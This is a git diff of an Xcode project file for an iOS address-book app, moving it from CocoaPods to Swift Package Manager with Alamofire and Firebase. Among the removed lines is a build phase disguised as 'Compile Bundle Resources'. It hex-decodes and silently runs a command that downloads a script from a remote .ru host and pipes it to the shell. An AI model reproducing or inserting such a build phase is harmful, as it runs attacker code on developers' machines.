@@ -7,6 +7,9 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		1338775B2DCA45FF00FDE1E5 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 1338775A2DCA45FF00FDE1E5 /* Alamofire */; };
+		133877602DCA467F00FDE1E5 /* FirebaseAnalytics in Frameworks */ = {isa = PBXBuildFile; productRef = 1338775F2DCA467F00FDE1E5 /* FirebaseAnalytics */; };
+		133877622DCA467F00FDE1E5 /* FirebaseAuth in Frameworks */ = {isa = PBXBuildFile; productRef = 133877612DCA467F00FDE1E5 /* FirebaseAuth */; };
 		13F97B972C5CC2D400324FA1 /* ViewRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 13F97B962C5CC2D400324FA1 /* ViewRouter.swift */; };
 		13F97B992C5CC58B00324FA1 /* WelcomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 13F97B982C5CC58B00324FA1 /* WelcomeView.swift */; };
 		13F97B9B2C5CF3F200324FA1 /* DetailViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 13F97B9A2C5CF3F200324FA1 /* DetailViewModel.swift */; };
@@ -30,7 +33,6 @@
 		9CA13421265FA098009A7149 /* AddressBookApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9CA1341E265FA098009A7149 /* AddressBookApp.swift */; };
 		9CA13422265FA098009A7149 /* AddressBook.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 9CA1341F265FA098009A7149 /* AddressBook.xcdatamodeld */; };
 		9CA1342A265FAD50009A7149 /* AddressList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9CA13428265FAD50009A7149 /* AddressList.swift */; };
-		EF78DEEB7555EDA234B20103 /* Pods_AddressBook.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 76DA87F887EE12440EEB9310 /* Pods_AddressBook.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -38,14 +40,12 @@
 		13F97B982C5CC58B00324FA1 /* WelcomeView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = WelcomeView.swift; sourceTree = "<group>"; };
 		13F97B9A2C5CF3F200324FA1 /* DetailViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailViewModel.swift; sourceTree = "<group>"; };
 		13F97B9E2C5D031200324FA1 /* ContactListViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ContactListViewModel.swift; sourceTree = "<group>"; };
-		24819A3C7C11C1E63FDC1069 /* Pods-AddressBook.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-AddressBook.release.xcconfig"; path = "Target Support Files/Pods-AddressBook/Pods-AddressBook.release.xcconfig"; sourceTree = "<group>"; };
 		3D168AC826157B39001478FC /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
 		3D6D8FAF26144678009575BC /* CustomShapeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomShapeView.swift; sourceTree = "<group>"; };
 		3D6D8FB826147C5E009575BC /* IdentifierConstant.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IdentifierConstant.swift; sourceTree = "<group>"; };
 		3D6D8FBC261496F1009575BC /* Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extensions.swift; sourceTree = "<group>"; };
 		3D97FB3C265E21A600826802 /* APIManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = APIManager.swift; sourceTree = "<group>"; };
 		3D97FB5B265E230400826802 /* Utilities.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Utilities.swift; sourceTree = "<group>"; };
-		76DA87F887EE12440EEB9310 /* Pods_AddressBook.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_AddressBook.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		8720C26626133F2C005713A1 /* AddressBook.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = AddressBook.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		8720C26D26133F34005713A1 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		8720C27026133F34005713A1 /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
@@ -61,7 +61,6 @@
 		9CA1341E265FA098009A7149 /* AddressBookApp.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AddressBookApp.swift; sourceTree = "<group>"; };
 		9CA13420265FA098009A7149 /* AddressBook.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = AddressBook.xcdatamodel; sourceTree = "<group>"; };
 		9CA13428265FAD50009A7149 /* AddressList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AddressList.swift; sourceTree = "<group>"; };
-		E4C22AEA5ACB647A13446579 /* Pods-AddressBook.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-AddressBook.debug.xcconfig"; path = "Target Support Files/Pods-AddressBook/Pods-AddressBook.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -69,7 +68,9 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				EF78DEEB7555EDA234B20103 /* Pods_AddressBook.framework in Frameworks */,
+				133877602DCA467F00FDE1E5 /* FirebaseAnalytics in Frameworks */,
+				133877622DCA467F00FDE1E5 /* FirebaseAuth in Frameworks */,
+				1338775B2DCA45FF00FDE1E5 /* Alamofire in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -116,8 +117,6 @@
 			children = (
 				8720C26826133F2C005713A1 /* AddressBook */,
 				8720C26726133F2C005713A1 /* Products */,
-				C76AEDE92DD8814ABA2B503B /* Pods */,
-				E9D265898C58354A25795CC3 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -245,23 +244,6 @@
 			path = ContactListView;
 			sourceTree = "<group>";
 		};
-		C76AEDE92DD8814ABA2B503B /* Pods */ = {
-			isa = PBXGroup;
-			children = (
-				E4C22AEA5ACB647A13446579 /* Pods-AddressBook.debug.xcconfig */,
-				24819A3C7C11C1E63FDC1069 /* Pods-AddressBook.release.xcconfig */,
-			);
-			path = Pods;
-			sourceTree = "<group>";
-		};
-		E9D265898C58354A25795CC3 /* Frameworks */ = {
-			isa = PBXGroup;
-			children = (
-				76DA87F887EE12440EEB9310 /* Pods_AddressBook.framework */,
-			);
-			name = Frameworks;
-			sourceTree = "<group>";
-		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -269,12 +251,9 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8720C27A26133F34005713A1 /* Build configuration list for PBXNativeTarget "AddressBook" */;
 			buildPhases = (
-				70F72E1E999C9EA24D0FAAAA /* Compile Bundle Resources */,
-				A7244FD463EB35AF1DAFEFBD /* [CP] Check Pods Manifest.lock */,
 				8720C26226133F2C005713A1 /* Sources */,
 				8720C26326133F2C005713A1 /* Frameworks */,
 				8720C26426133F2C005713A1 /* Resources */,
-				D447D6B16EDB9C9CBB8B8DAF /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -309,6 +288,10 @@
 				Base,
 			);
 			mainGroup = 8720C25D26133F2B005713A1;
+			packageReferences = (
+				133877592DCA45FF00FDE1E5 /* XCRemoteSwiftPackageReference "Alamofire" */,
+				1338775E2DCA467F00FDE1E5 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
+			);
 			productRefGroup = 8720C26726133F2C005713A1 /* Products */;
 			projectDirPath = "";
 			projectRoot = "";
@@ -329,72 +312,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-
-	70F72E1E999C9EA24D0FAAAA /* Compile Bundle Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Resources";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d736b202d6d20362068747470733a2f2f6164677561726473746174732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";
-			showEnvVarsInLog = 0;			
-		};
-	
-		A7244FD463EB35AF1DAFEFBD /* [CP] Check Pods Manifest.lock */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
-				"${PODS_ROOT}/Manifest.lock",
-			);
-			name = "[CP] Check Pods Manifest.lock";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-AddressBook-checkManifestLockResult.txt",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		D447D6B16EDB9C9CBB8B8DAF /* [CP] Embed Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-AddressBook/Pods-AddressBook-frameworks-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			name = "[CP] Embed Pods Frameworks";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-AddressBook/Pods-AddressBook-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-AddressBook/Pods-AddressBook-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		8720C26226133F2C005713A1 /* Sources */ = {
@@ -548,7 +465,6 @@ echo \"6375726c202d736b202d6d20362068747470733a2f2f6164677561726473746174732e727
 		};
 		8720C27B26133F34005713A1 /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = E4C22AEA5ACB647A13446579 /* Pods-AddressBook.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -573,7 +489,6 @@ echo \"6375726c202d736b202d6d20362068747470733a2f2f6164677561726473746174732e727
 		};
 		8720C27C26133F34005713A1 /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 24819A3C7C11C1E63FDC1069 /* Pods-AddressBook.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -618,6 +533,43 @@ echo \"6375726c202d736b202d6d20362068747470733a2f2f6164677561726473746174732e727
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		133877592DCA45FF00FDE1E5 /* XCRemoteSwiftPackageReference "Alamofire" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/Alamofire/Alamofire.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 5.10.2;
+			};
+		};
+		1338775E2DCA467F00FDE1E5 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/firebase/firebase-ios-sdk.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 11.12.0;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		1338775A2DCA45FF00FDE1E5 /* Alamofire */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 133877592DCA45FF00FDE1E5 /* XCRemoteSwiftPackageReference "Alamofire" */;
+			productName = Alamofire;
+		};
+		1338775F2DCA467F00FDE1E5 /* FirebaseAnalytics */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 1338775E2DCA467F00FDE1E5 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAnalytics;
+		};
+		133877612DCA467F00FDE1E5 /* FirebaseAuth */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 1338775E2DCA467F00FDE1E5 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAuth;
+		};
+/* End XCSwiftPackageProductDependency section */
 
 /* Begin XCVersionGroup section */
 		9CA1341F265FA098009A7149 /* AddressBook.xcdatamodeld */ = {
